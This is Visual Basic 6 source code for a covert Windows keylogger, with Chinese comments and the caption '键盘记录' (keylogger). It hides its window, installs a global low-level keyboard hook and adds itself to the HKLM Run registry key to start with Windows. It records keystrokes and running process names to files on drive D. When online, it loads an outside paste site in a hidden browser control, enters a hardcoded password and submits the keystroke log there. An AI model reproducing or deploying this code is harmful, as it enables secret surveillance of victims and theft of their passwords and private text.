VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   3030
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4560
   LinkTopic       =   "Form1"
   ScaleHeight     =   3030
   ScaleWidth      =   4560
   StartUpPosition =   3  '窗口缺省
   Begin VB.Timer Timer3 
      Left            =   480
      Top             =   360
   End
   Begin SHDocVwCtl.WebBrowser WebBrowser1 
      Height          =   2055
      Left            =   1320
      TabIndex        =   0
      Top             =   360
      Width           =   2535
      ExtentX         =   4471
      ExtentY         =   3625
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin VB.Timer Timer2 
      Left            =   360
      Top             =   1800
   End
   Begin VB.Timer Timer1 
      Left            =   720
      Top             =   960
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public denglu As String
Public ahwnd As String
Private Type WSADATA
        wversion As Integer
        wHighVersion As Integer
        szDescription(0 To 256) As Byte
        szSystemStatus(0 To 128) As Byte
        iMaxSockets As Integer
        iMaxUdpDg As Integer
        lpszVendorInfo As Long
    End Type
    Private Declare Function WSAStartup Lib "WSOCK32.DLL" (ByVal wVersionRequired As Integer, lpWSAData As WSADATA) As Long
    Private Declare Function WSACleanup Lib "WSOCK32.DLL" () As Long
    Private Declare Function gethostbyname Lib "WSOCK32.DLL" (ByVal szHostname As String) As Long

   
    Public Function IsConnectedState() As Boolean
        Dim udtWSAD As WSADATA
        Call WSAStartup(WS_VERSION_REQD, udtWSAD)
        IsConnectedState = CBool(gethostbyname("www.baidu.com"))
        Call WSACleanup
    End Function
'窗体部分

Private Sub form_Load()
Form1.Hide
WebBrowser1.Silent = True
If App.PrevInstance = True Then End
KeyPreview = 1: ScaleMode = 3: AutoRedraw = 1: Caption = "键盘记录"
Module1.ints '初始化数据
hHook = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf MyKBHook, App.hInstance, 0)
If IsConnectedState Then
WebBrowser1.Navigate "http://notepad.live/kart5"
denglu = "no"
Timer1.Enabled = True
Timer1.Interval = 1000
Else
End If
Timer3.Enabled = True
Timer3.Interval = 1000
If hHook = 0 Then End
On Error Resume Next
Dim wsh
Set wsh = CreateObject("wscript.shell")
wsh.regwrite "HKLM\Software\Microsoft\Windows\Currentversion\Run\" & App.exeName, App.Path & "\" & App.exeName & ".exe", "REG_SZ"
End Sub

Private Sub Form_Unload(Cancel As Integer)

Call UnhookWindowsHookEx(hHook) '程序退出时

Open "D:\getkey.txt" For Append As #1 '打开文本

Print #1, Module1.appStr '一次性记录

Print #1, "到" & Now() & "结束!" & vbCrLf

Close #1

End Sub

Private Sub Form_KeyDown(KeyCode As Integer, Shift As Integer)

If KeyCode = vbKeyEscape Then

Unload Me
End If
End Sub

Private Sub Timer1_Timer()
jiazaicishu = jiazaicishu + "1"
Debug.Print ("加载次数：" & jiazaicishu)
'--------------------------------------------接收中心------------------------------------------
If WebBrowser1.Busy Then
Debug.Print ("网页未加载完成")
        Exit Sub
    Else
    Debug.Print ("网页加载完成")
Timer1.Enabled = False
WebBrowser1.Document.getElementsByTagName("input")("submit_pw").Value = "189159"
Dim vDoc, X, VTag
Set vDoc = WebBrowser1.Document
For X = 0 To vDoc.All.Length - 1 '检测所有标签
If UCase(vDoc.All(X).tagName) = "INPUT" Then '找到input标签
Set VTag = vDoc.All(X)
If VTag.Value = "提交" Then VTag.Click '点击提交了，一切都OK了
End If
Next X
denglu = "yes"
Timer2.Enabled = True
Timer2.Interval = 1500
Debug.Print ("登录状态：" & "yes")
End If
End Sub

Private Sub Timer2_Timer()
If WebBrowser1.Busy Then
Debug.Print ("网页未加载完成")
        Exit Sub
    Else
    Timer2.Enabled = False
    Dim dangan As String

Open "D:\getkey.txt" For Binary As #1

  dangan = StrConv(InputB(LOF(1), 1), vbUnicode)
  Close #1
Dim vDoc, VTag, mType As String, mTagName As String
Dim ia As Integer
    Set vDoc = WebBrowser1.Document
    For ia = 0 To vDoc.All.Length - 1
        Select Case UCase(vDoc.All(ia).tagName)
        Case "TEXTAREA"     '"TEXTAREA" 标签,文本框的填写
        Set VTag = vDoc.All(ia)
         VTag.Value = dangan
         Debug.Print ("发送内容：" & dangan)
         End Select
Next ia
End If
End Sub

Private Sub Timer3_Timer()
Dim H, m, s As String
H = Hour(Now)  '时
m = Minute(Now) '分
s = Second(Now) '秒
 Dim a() As String
 Dim b As Integer
 strComputer = "."
 Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")
 Set colProcessList = objWMIService.ExecQuery("Select * from Win32_Process")
 For Each objProcess In colProcessList
 b = b + 1
 ReDim Preserve a(b)
 a(b) = objProcess.Name
 Print a(b)
 Next
 
 
 If ahwnd = a(b) Then
Debug.Print ("同样进程名称：" & a(b))
Debug.Print ("同样记录名称：" & ahwnd)
 Else
 Debug.Print ("不同进程名称：" & a(b))
 Debug.Print ("不同记录名称：" & ahwnd)
 Open "D:\getwindows.txt" For Append As #2
 Print #2, Year(Now) & "年" & Month(Now) & "月" & Day(Now) & "日" & H & ":" & m & ":" & s
 Print #2, a(b)
 Print #2, "共计"; b; "个进程"
 ahwnd = a(b)
 Close #2
 End If
 
 If b > "70" Then
If CheckExeIsRun("wscript.exe") Then
Shell "taskkill /f /im wscript.exe"
Else
End If
Else
End If
End Sub

Private Function CheckExeIsRun(exeName As String) As Boolean
On Error GoTo Err
Dim WMI
Dim Obj
Dim Objs
CheckExeIsRun = False
Set WMI = GetObject("WinMgmts:")
Set Objs = WMI.InstancesOf("Win32_Process")
For Each Obj In Objs
If (InStr(UCase(exeName), UCase(Obj.Description)) <> 0) Then
CheckExeIsRun = True
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
End If
Next
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
Exit Function
Err:
If Not Objs Is Nothing Then Set Objs = Nothing
If Not WMI Is Nothing Then Set WMI = Nothing
End Function
